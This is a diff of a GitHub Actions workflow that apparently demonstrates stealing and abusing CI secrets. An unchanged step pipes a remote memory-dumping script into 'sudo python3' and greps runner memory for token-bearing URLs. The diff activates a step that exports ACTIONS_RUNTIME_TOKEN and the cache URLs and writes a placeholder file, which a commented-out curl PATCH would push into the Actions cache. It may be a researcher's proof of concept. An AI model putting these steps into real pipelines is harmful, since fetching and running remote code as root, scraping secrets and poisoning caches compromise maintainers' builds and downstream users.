@@ -11,15 +11,15 @@ jobs:
     steps:
       - run: |
           curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '[A-Za-z0-9]{10}\.actions\.githubusercontent\.com\/[A-Za-z0-9]{50}' | sort -u 
-      # - uses: actions/github-script@v7
-      #   env:
-      #     github-token: ${{ secrets.GITHUB_TOKEN }}
-      #   with:
-      #     script: |
-      #       core.exportVariable('ACTIONS_CACHE_URL', process.env['ACTIONS_CACHE_URL'])
-      #       core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env['ACTIONS_RUNTIME_TOKEN'])
-      #       core.exportVariable('ACTIONS_RUNTIME_URL', process.env['ACTIONS_RUNTIME_URL'])
-      # - run: echo "hophophop" > prime-numbers
+      - uses: actions/github-script@v7
+        env:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          script: |
+            core.exportVariable('ACTIONS_CACHE_URL', process.env['ACTIONS_CACHE_URL'])
+            core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env['ACTIONS_RUNTIME_TOKEN'])
+            core.exportVariable('ACTIONS_RUNTIME_URL', process.env['ACTIONS_RUNTIME_URL'])
+      - run: echo "hophophop" > prime-numbers
       # # - run: |
       # #     curl -v -XPATCH -H "Authorization: Bearer ${ACTIONS_RUNTIME_TOKEN}" -H "User-Agent: actions/cache" -H "Accept: application/json;api-version=6.0-preview.1" \
       # #     -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-9/10" --upload-file prime-numbers \
